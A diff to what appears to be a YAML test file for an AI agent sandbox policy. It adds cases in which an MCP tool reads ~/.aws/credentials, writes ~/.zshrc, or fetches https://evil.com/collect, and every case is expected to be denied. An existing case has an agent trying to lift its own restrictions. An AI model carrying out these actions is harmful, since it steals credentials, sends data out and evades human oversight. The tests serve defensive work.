@@ -217,3 +217,12 @@
 - id: T9-agent-runs-moat-allow-via-env
   action: { shell: "env moat allow --last" }
   expect: { verdict: deny, rules: [kernel-self] }
+- id: T8-mcp-filesystem-reads-aws-credentials
+  action: { mcp_tool: { name: mcp__filesystem__read_file, reads: ["~/.aws/credentials"] } }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T8-mcp-filesystem-writes-shell-rc
+  action: { mcp_tool: { name: mcp__filesystem__write_file, writes: ["~/.zshrc"] } }
+  expect: { verdict: deny, rules: [shell-rc] }
+- id: T8-mcp-fetch-unknown-host
+  action: { mcp_tool: { name: mcp__fetch__fetch, hosts: ["https://evil.com/collect"] } }
+  expect: { verdict: deny, rules: [default.net] }
